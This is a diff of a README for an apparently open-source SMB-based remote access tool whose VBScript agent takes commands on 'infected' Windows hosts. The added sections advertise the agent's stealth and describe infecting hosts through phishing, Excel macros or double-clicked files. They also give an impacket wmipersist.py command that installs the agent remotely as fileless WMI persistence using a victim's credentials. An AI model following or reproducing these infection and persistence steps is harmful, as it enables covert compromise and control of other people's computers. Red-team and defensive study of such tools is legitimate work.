@@ -17,8 +17,12 @@ None would notice one more connection attempt. *Right?*
 
 ### Agent
 
-The `agent` is a *Visual Basic Script* that runs on the infected host and connects to the *SMB Server*. It creates a folder in there named after the host's `hostname` and primary `MAC` address (trying to be *unique* and *informative* at the same time for reporting purposes).
+#### Documentation/Archiving Friendly
+The `agent` is a *Visual Basic Script* that runs on the infected host and connects to the *SMB Server*. It creates a directory in there named after the host's `hostname` and primary `MAC` address (trying to be *unique* and *informative* at the same time for reporting purposes). All commands and info for the infected Host will be stored in this directory. `zip`ping the whole Shared Folder will archive all project info!
+
+#### Stealthy
 It does **NOT** use a drive letter to *Mount* the Share, just uses `UNC paths` to directly read remote files (no *Drive* is created in `explorer.exe`).
+
 It also injects the `UNC path` into the `%PATH%` variable of its own execution environment (you can run executables directly from your Linux machine's filesystem).
 
 #### Agent's Execution
@@ -59,12 +63,14 @@ Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies
 
 ## Infection Scheme
 
-A *While loop* can be added to the `agent.vbs`  file's beginning, with a delay statement of multiple seconds (10 secs is ideal), and it will be able to infect windows hosts by *double clicking* / *phishing* / *excel macros* / etc...
+### Infect a Host from a file
+A *While loop* can be added to the `agent.vbs` file's beginning, with a delay statement of multiple seconds (10 secs is ideal), and it will be able to infect windows hosts by *double clicking* / *phishing* / *excel macros* / etc...
 
+### Infect a Host *fileless*
 Yet, if a Windows host has *RPC* enabled, it is possible to install the *VBS* file as *fileless malware* through `WMI` and the fabulous `impacket` package examples with a command like:
 ```bash
 $ examples/wmipersist.py '<username>:<password>@<hostname/ipaddress>' install -vbs agent.vbs -name smbrat -timer 10
-```  
+```
 
 It is also possible to utilize the `WMI` tool by local access to install the `agent.vbs` as fileless malware.
 
@@ -208,3 +214,7 @@ $ smbmap -H 172.16.47.189
 This is a *NULL session* (like FTP anonymous login). **EVERYONE can change the SHARE Files** and get *Remote Code Execution* on all infected machines.
 
 * Better fire up some `iptables` here...
+
+### The sessions are NOT **Interactive**
+
+Type `execall netsh` and you lost all your Agents. None will respond as the `agent.vbs` will spawn the `netsh.exe` shell and will wait for it to terminate, so it can write its contents to `output.dat`. But Guess What... It **won't** terminate... It's gonna hang with the `netsh>` pointing to the void.
